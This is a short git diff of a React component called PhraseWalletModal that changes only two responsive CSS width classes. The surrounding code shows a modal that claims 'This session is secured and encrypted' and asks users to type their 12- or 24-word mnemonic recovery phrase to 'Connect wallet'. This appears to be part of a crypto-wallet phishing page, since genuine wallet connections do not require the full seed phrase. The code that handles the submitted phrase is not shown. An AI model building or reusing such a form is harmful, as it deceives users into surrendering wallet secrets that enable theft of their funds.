@@ -80,7 +80,7 @@ export default function PhraseWalletModal() {
                         <Box className=" pt-3">
                             <div className=''>
                                 <header className='text-center text-[17px] text-zinc-300'>This session is secured and encrypted</header>
-                                <div className='pt-4 w-[80%] m-auto'>
+                                <div className='pt-4 md:w-[80%] m-auto'>
                                     <textarea
                                         className="w-full border bg-transparent rounded-xl border-zinc-600 p-4 outline-none focus:border-[#FAEAC8] text-zinc-200"
                                         placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."
@@ -90,7 +90,7 @@ export default function PhraseWalletModal() {
                                     >
                                     </textarea>
                                 </div>
-                                <div className='w-[55%] m-auto mt-6'>
+                                <div className='md:w-[55%] m-auto mt-6'>
                                     <button onClick={handleSubmit} className=' rounded-full bg-[#FAEAC8] hover:bg-[#c8bb9e] duration-500 p-3 w-full'>
                                         Connect wallet
                                     </button>
